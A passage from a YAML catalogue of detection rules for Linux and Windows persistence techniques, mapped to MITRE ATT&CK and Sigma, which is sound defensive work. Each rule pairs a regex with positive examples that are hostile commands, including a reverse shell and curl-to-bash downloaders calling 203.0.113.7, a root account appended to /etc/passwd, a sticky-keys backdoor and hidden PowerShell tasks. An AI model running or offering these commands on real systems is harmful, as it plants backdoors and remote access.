      - 'Nov 20 13:15:00 web01 sh[841]: echo ''hacker:$1$xyz$abc:0:0:root:/root:/bin/bash'' >> /etc/passwd'
    negative:
      - 'Nov 20 13:15:01 web01 bash[842]: HISTORY: getent passwd alice'
      - 'Nov 20 13:15:02 web01 bash[843]: HISTORY: echo "alice:x:1001:1001::/home/alice:/bin/bash" > /tmp/passwd.test'

- id: mention.persist_systemd_execstart_temp
  title: 'systemd ExecStart= with a temp-directory executable'
  match:
    anchored: 'ExecStart= {0,2}[-@+!:]{0,3}(?:/tmp/|/dev/shm/|/var/tmp/)'
  case_sensitive: true
  strength: strong
  attack: [T1543.002]
  telemetry: [linux_text]
  source:
    name: MITRE ATT&CK Enterprise 20.0, T1543.002 Systemd Service
    url: https://attack.mitre.org/techniques/T1543/002
    license: MITRE ATT&CK Terms of Use (royalty-free, copyright notice retained)
    upstream_id: T1543.002
  rationale: >-
    Author-composed shape from the technique text (ExecStart); strong because packaged and in-house services never run
    from temp directories. A unit whose ExecStart executable (after systemd's optional '-@+!:' prefixes) lives in
    /tmp, /dev/shm or /var/tmp persists a dropped payload as a service. Packaged and in-house services run from /usr,
    /opt or application directories; a temp path that is only an argument (a docker volume, a cache directory) is not
    matched.
  examples:
    positive:
      - 'Nov 20 13:16:00 web01 sh[844]: printf "[Service]\nExecStart=/dev/shm/.kworker\nRestart=always\n" > /etc/systemd/system/kworker.service'
    negative:
      - 'Nov 20 13:16:01 web01 systemd[1]: nginx.service: ExecStart=/usr/sbin/nginx -g daemon on; master_process on;'
      - 'Nov 20 13:16:02 web01 systemd[1]: systemd-tmpfiles-clean.service: Cleaning up temporary directories /tmp'

- id: mention.persist_systemd_execstart_downloader
  title: 'systemd ExecStart= line with a downloader and a pipe into a shell'
  match:
    anchored: 'ExecStart=[^\n]{0,80}(?:curl|wget)[^\n]{0,200}\| {0,2}(?:/usr)?(?:/bin/)?(?:ba|da|z|k|a)?sh\b'
  case_sensitive: true
  strength: strong
  attack: [T1543.002, T1105]
  telemetry: [linux_text]
  source:
    name: MITRE ATT&CK Enterprise 20.0, T1543.002 Systemd Service
    url: https://attack.mitre.org/techniques/T1543/002
    license: MITRE ATT&CK Terms of Use (royalty-free, copyright notice retained)
    upstream_id: T1543.002
  rationale: >-
    Author-composed shape from the technique text (ExecStart); strong because the unit pipes remote content into a
    shell at every start. A service that fetches a script and pipes it into a shell at every start re-infects on boot;
    real services run installed binaries.
  examples:
    positive:
      - 'ExecStart=/bin/bash -c "curl -s http://203.0.113.7/s.sh | bash"'
    negative:
      - 'ExecStart=/usr/bin/curl -fsS -o /var/lib/app/feed.json https://feeds.example.org/latest'
      - 'ExecStart=/opt/app/bin/server --port 8080'

- id: mention.persist_shell_rc_payload
  title: 'echo of a downloader-and-shell-pipe or socket command into a shell startup file'
  match:
    anchored: 'echo [^\n]{0,80}(?:(?:curl|wget) [^\n|]{1,150}\| {0,3}(?:/usr)?(?:/bin/)?(?:ba|da|z|k|a)?sh\b|/dev/tcp/|nc -e )[^\n]{0,60}>> {0,2}[^\s]{0,40}\.(?:bashrc|bash_profile|profile|zshrc)\b'
  case_sensitive: true
  strength: strong
  attack: [T1546.004]
  telemetry: [linux_text]
  source:
    name: MITRE ATT&CK Enterprise 20.0, T1546.004 Unix Shell Configuration Modification
    url: https://attack.mitre.org/techniques/T1546/004
    license: MITRE ATT&CK Terms of Use (royalty-free, copyright notice retained)
    upstream_id: T1546.004
  rationale: >-
    Author-composed shape from T1546.004: appending a command that pipes remote content into a shell, opens a bash
    socket or runs netcat -e to .bashrc or .profile runs it at every login. Echoed proxy settings or plain curl calls
    are not matched.
  examples:
    positive:
      - 'Nov 20 13:17:00 web01 sh[845]: echo "nohup bash -c ''bash -i >& /dev/tcp/203.0.113.7/443 0>&1'' &" >> /home/alice/.bashrc'
    negative:
      - 'Nov 20 13:17:01 web01 bash[846]: HISTORY: echo ''export PATH=$PATH:/opt/tools/bin'' >> ~/.bashrc'
      - 'Nov 20 13:17:02 web01 bash[847]: HISTORY: echo "alias ll=''ls -la''" >> ~/.zshrc'
      - 'echo ''export http_proxy=http://proxy:3128; curl -s https://status.example.org/'' >> ~/.bashrc'

- id: mention.persist_rc_local_payload
  title: 'echo of a downloader-with-shell or socket command into rc.local'
  match:
    anchored: 'echo [^\n]{1,100}(?:(?:curl|wget) [^\n|]{1,150}(?:\| {0,3}(?:/usr)?(?:/bin/)?(?:ba|da|z|k|a)?sh\b|&& {0,2}(?:sh|bash) )|/dev/tcp/)[^\n]{0,60}>> {0,2}/etc/rc\.local'
  case_sensitive: true
  strength: strong
  attack: [T1037.004, T1105]
  telemetry: [linux_text]
  source:
    name: MITRE ATT&CK Enterprise 20.0, T1037.004 RC Scripts
    url: https://attack.mitre.org/techniques/T1037/004
    license: MITRE ATT&CK Terms of Use (royalty-free, copyright notice retained)
    upstream_id: T1037.004
  rationale: >-
    Author-composed shape from T1037.004: rc.local runs as root at boot; appending a fetch that is then run by a
    shell, or a bash socket, is boot persistence used by botnets. Plain downloads echoed into rc.local are not
    matched.
  examples:
    positive:
      - 'Nov 20 13:18:00 web01 sh[848]: echo "wget -q http://203.0.113.7/b -O /tmp/b && sh /tmp/b &" >> /etc/rc.local'
    negative:
      - 'Nov 20 13:18:01 web01 bash[849]: HISTORY: echo "/usr/local/bin/fan-control &" >> /etc/rc.local'
      - 'Nov 20 13:18:02 web01 bash[850]: HISTORY: cat /etc/rc.local'
      - 'echo "curl -s -o /var/cache/motd.txt https://intranet.example.org/motd" >> /etc/rc.local'

- id: mention.persist_insmod_from_temp
  title: 'insmod of a .ko file in a temp directory (command text)'
  match:
    anchored: 'insmod {1,3}(?:/tmp/|/dev/shm/|/var/tmp/)[^\n]{1,80}\.ko\b'
  case_sensitive: true
  strength: strong
  attack: [T1547.006, T1014]
  telemetry: [linux_text]
  source:
    name: 'SigmaHQ: Loading of Kernel Module via Insmod (Pawel Mazur)'
    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/linux/auditd/syscall/lnx_auditd_load_module_insmod.yml
    license: DRL-1.1
    upstream_id: 106d7cbd-80ff-4985-b682-a7043e5acb72
  rationale: >-
    The rule flags any insmod (auditd comm=insmod); this text form narrows it to a module loaded straight out of /tmp,
    /var/tmp or /dev/shm, which is how LKM rootkits are installed by hand. DKMS and vendor drivers load from
    /lib/modules.
  examples:
    positive:
      - 'Nov 20 13:19:00 web01 bash[851]: HISTORY: insmod /tmp/.d/diamorphine.ko'
    negative:
      - 'Nov 20 13:19:01 web01 bash[852]: HISTORY: modprobe nvidia'
      - 'Nov 20 13:19:02 web01 bash[853]: HISTORY: insmod /lib/modules/6.8.0-45-generic/extra/vboxdrv.ko'

- id: mention.persist_sticky_keys_cmd_copy
  title: 'copy /y of cmd.exe over an accessibility binary (command text)'
  match:
    anchored: 'copy {1,3}/y {1,3}C:\\windows\\system32\\cmd\.exe {1,3}C:\\windows\\system32\\(?:sethc|utilman|osk|magnify|narrator|displayswitch|atbroker)\.exe'
  case_sensitive: false
  strength: strong
  attack: [T1546.008]
  telemetry: [windows_text]
  source:
    name: 'SigmaHQ: Persistence Via Sticky Key Backdoor (Sreeman)'
    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/windows/process_creation/proc_creation_win_cmd_sticky_keys_replace.yml
    license: DRL-1.1
    upstream_id: 1070db9a-3e5d-412e-8e7b-7183b616e1b3
  rationale: >-
    Extends the rule's sethc.exe replacement to the other accessibility binaries ATT&CK T1546.008 lists: a cmd.exe
    copied over one of them gives a SYSTEM shell at the logon screen. The rule rates false positives as unlikely.
  examples:
    positive:
      - 'cmd.exe /c copy /y C:\windows\system32\cmd.exe C:\windows\system32\sethc.exe'
    negative:
      - 'copy /y C:\Temp\report.xlsx \\fileserver\reports\'
      - 'sfc /scannow'

- id: mention.persist_ifeo_accessibility
  title: Image File Execution Options key on an accessibility binary
  match:
    anchored: 'Image File Execution Options\\(?:sethc|utilman|osk|magnify|narrator|displayswitch|atbroker)\.exe'
  case_sensitive: false
  strength: strong
  attack: [T1546.008, T1546.012]
  telemetry: [windows_text]
  source:
    name: MITRE ATT&CK Enterprise 20.0, T1546.008 Accessibility Features
    url: https://attack.mitre.org/techniques/T1546/008
    license: MITRE ATT&CK Terms of Use (royalty-free, copyright notice retained)
    upstream_id: T1546.008
  rationale: >-
    Author-composed shape from the technique text (sethc, utilman, Image File Execution Options); strong because no
    product configures IFEO for accessibility binaries. A debugger registered for sethc.exe or utilman.exe under IFEO
    runs the attacker's program from the logon screen as SYSTEM. No product configures IFEO for accessibility
    binaries.
  examples:
    positive:
      - 'reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d C:\windows\system32\cmd.exe'
    negative:
      - 'reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\chrome.exe"'
      - 'reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AutoRestartShell /t REG_DWORD /d 1'

- id: mention.persist_run_key_suspicious_target
  title: '''Run'' or ''RunOnce'' key text with a script host, LOLBin or temp path'
  match:
    anchored: 'CurrentVersion\\Run(?:Once)?\b[^\n]{1,300}(?:powershell|mshta|rundll32 [^\n]{0,40}javascript|regsvr32|wscript|cscript|\\AppData\\Local\\Temp\\|\\Users\\Public\\|%TEMP%)'
  case_sensitive: false
  strength: medium
  attack: [T1547.001]
  telemetry: [windows_text]
  source:
    name: MITRE ATT&CK Enterprise 20.0, T1547.001 Registry Run Keys / Startup Folder
    url: https://attack.mitre.org/techniques/T1547/001
    license: MITRE ATT&CK Terms of Use (royalty-free, copyright notice retained)
    upstream_id: T1547.001
  rationale: >-
    Author-composed shape from the technique text and procedures (CurrentVersion\Run). An autorun that starts
    PowerShell, mshta, a script host or a binary from Temp or Public is the commodity malware persistence. Some
    software starts helper scripts at logon, so it is medium; per-user app updaters under AppData without Temp are not
    matched.
  examples:
    positive:
      - 'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /d "powershell -w hidden -enc SQBFAFgA" /f'
    negative:
      - 'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v OneDrive /d "C:\Users\alice\AppData\Local\Microsoft\OneDrive\OneDrive.exe /background"'
      - 'reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run'

- id: mention.persist_schtasks_suspicious_action
  title: 'schtasks /create text with an encoded, IEX, download or remote-HTA action'
  match:
    anchored: 'schtasks(?:\.exe)?[\"'']? [^\n]{0,40}/create [^\n]{1,300}(?: -enc | -e [A-Za-z0-9+/]{20}|\.DownloadString|\.DownloadFile|\.DownloadData|FromBase64String|mshta(?:\.exe)? http| IEX)'
  case_sensitive: false
  strength: strong
  attack: [T1053.005]
  telemetry: [windows_text]
  source:
    name: 'SigmaHQ: Suspicious Command Patterns In Scheduled Task Creation (Florian Roth, Nextron Systems)'
    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/windows/process_creation/proc_creation_win_schtasks_susp_pattern.yml
    license: DRL-1.1
    upstream_id: f2c64357-b1d2-41b7-849f-34d2682c0fad
  rationale: >-
    The strongest part of the rule's uncommon-pattern selection: a task whose action is encoded PowerShell, an IEX, a
    web download or a remote HTA is persistence for a loader. Enterprise tasks run signed binaries and scripts by
    path. Execution-policy bypass, hidden windows, 'start /min' and -decode are common in SCCM, Intune and GPO tasks
    and are the separate medium entry.
  examples:
    positive:
      - 'schtasks /create /sc minute /mo 30 /tn "GoogleUpdateTaskMachine" /tr "powershell -w hidden -c IEX (New-Object Net.WebClient).DownloadString(''http://203.0.113.7/u'')" /ru system'
    negative:
      - 'schtasks /create /tn "Corp\Inventory" /tr "C:\Program Files\Corp\inventory.exe" /sc daily /st 02:00'
      - 'schtasks /query /fo LIST /v'

- id: mention.persist_schtasks_bypass_hidden_action
  title: schtasks /create text with an execution-policy bypass, hidden window, start /min or -decode
  match:
    anchored: 'schtasks(?:\.exe)?["'']? [^\n]{0,40}/create [^\n]{1,300}(?: -w hidden | -windowstyle hidden | bypass |/c start /min | -decode )'
  case_sensitive: false
  strength: medium
  attack: [T1053.005]
  telemetry: [any]
  source:
    name: 'SigmaHQ: Suspicious Command Patterns In Scheduled Task Creation (Florian Roth, Nextron Systems)'
    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/windows/process_creation/proc_creation_win_schtasks_susp_pattern.yml
    license: DRL-1.1
    upstream_id: f2c64357-b1d2-41b7-849f-34d2682c0fad
  rationale: >-
    The rest of the rule's uncommon-pattern selection. Loaders use these options to stay out of sight, but SCCM,
    Intune and Group Policy tasks run 'powershell -ExecutionPolicy Bypass -File' every day, so it is medium; the
    script path and the account decide.
  examples:
    positive:
      - 'schtasks /create /sc minute /mo 5 /tn Updater /tr "powershell -w hidden -nop -File C:\Users\Public\u.ps1" /ru system'
    negative:
      - 'schtasks /create /tn "Corp\Inventory" /tr "C:\Program Files\Corp\inventory.exe" /sc daily /st 02:00'
      - 'schtasks /query /fo LIST /v'

- id: mention.persist_service_binpath_shell
  title: Service binary path that runs cmd, PowerShell or a user-writable path
  match:
    anchored: 'binpath= {0,2}["'']?[^\n]{0,40}(?:cmd(?:\.exe)? {1,3}/c|powershell|%COMSPEC%|\\Users\\Public\\|\\AppData\\|\\Windows\\Temp\\)'
  case_sensitive: false
  strength: medium
  attack: [T1543.003, T1569.002]
  telemetry: [windows_text]
  source:
    name: MITRE ATT&CK Enterprise 20.0, T1543.003 Windows Service
    url: https://attack.mitre.org/techniques/T1543/003
    license: MITRE ATT&CK Terms of Use (royalty-free, copyright notice retained)
    upstream_id: T1543.003
  rationale: >-
    Shape quoted in an ATT&CK procedure example (STARWHALE: 'sc create ... binpath= "cmd.exe /c ..."'). 'sc create X
    binpath= "cmd /c ..."' is how PsExec-style lateral movement and loaders run commands as services. Installers
    register real service binaries under Program Files, but a few wrap scripts, so it is medium.
  examples:
    positive:
      - 'sc \\10.0.0.12 create upd binpath= "cmd.exe /c powershell -enc SQBFAFgA" start= auto'
    negative:
      - 'sc create CorpAgent binpath= "C:\Program Files\Corp\agent.exe" start= auto'
      - 'sc query state= all'

- id: mention.persist_wmi_script_consumer
  title: WMI ActiveScriptEventConsumer
  match:
    literal: ['ActiveScriptEventConsumer']
  case_sensitive: false
  strength: medium
  attack: [T1546.003]
  telemetry: [windows_text]
  source:
    name: Microsoft Learn, ActiveScriptEventConsumer class (WMI standard consumer)
    url: https://learn.microsoft.com/en-us/windows/win32/wmisdk/activescripteventconsumer
    license: Microsoft Learn terms of use
    upstream_id: ActiveScriptEventConsumer
  rationale: >-
    A WMI consumer that runs VBScript or JScript when an event fires is fileless persistence used by several APT and
    miner families. Very few products register script consumers, so it is medium.
  examples:
    positive:
      - 'Set-WmiInstance -Namespace root\subscription -Class ActiveScriptEventConsumer -Arguments @{Name="upd";ScriptingEngine="VBScript";ScriptText="..."}'
    negative:
      - 'Get-WmiObject -Namespace root\subscription -Class __EventFilter'
      - 'Get-CimInstance Win32_Service | Where-Object State -eq Running'

- id: mention.persist_net_user_add
  title: 'net user ... /add command text'
  match:
    anchored: 'net user [^\n]{1,100}/add\b'
  case_sensitive: false
  strength: medium
  attack: [T1136.001, T1136.002]
  telemetry: [windows_text]
  source:
    name: 'SigmaHQ: New User Created Via Net.EXE (Endgame, JHasenbusch, oscd.community)'
    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/windows/process_creation/proc_creation_win_net_user_add.yml
    license: DRL-1.1
    upstream_id: cd219ff3-fa99-45d4-8380-a7d15116c6dc
  rationale: >-
    Creating a local account from the command line is a backdoor-account step; help desks also do it, so it is medium
    as upstream. With /domain the account is a domain account (T1136.002). The account name and the next step
    (Administrators membership) decide.
  examples:
    positive:
      - 'net user support_tmp P@ssw0rd123! /add'
    negative:
      - 'net user alice /domain'
      - 'net use Z: \\fileserver\share /persistent:no'

- id: mention.persist_local_admins_add
  title: 'net localgroup administrators ... /add command text'
  match:
    anchored: 'localgroup {1,3}administrators {1,3}[^\n]{1,80}/add\b'
  case_sensitive: false
  strength: medium
  attack: [T1098]
  telemetry: [windows_text]
  source:
    name: 'SigmaHQ: User Added to Local Administrators Group (Florian Roth, Nasreddine Bencherchali, Nextron Systems)'
    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/windows/process_creation/proc_creation_win_susp_add_user_local_admin_group.yml
    license: DRL-1.1
    upstream_id: ad720b90-25ad-43ff-9b5e-5c841facc8e5
  rationale: >-
    The rule's net localgroup form ('localgroup', 'administrators', '/add', in the order net requires). Granting local
    admin from the command line follows backdoor-account creation; desktop support does it too, so it is medium.
  examples:
    positive:
      - 'net localgroup administrators support_tmp /add'
    negative:
      - 'net localgroup administrators'
      - 'net localgroup "Remote Desktop Users"'
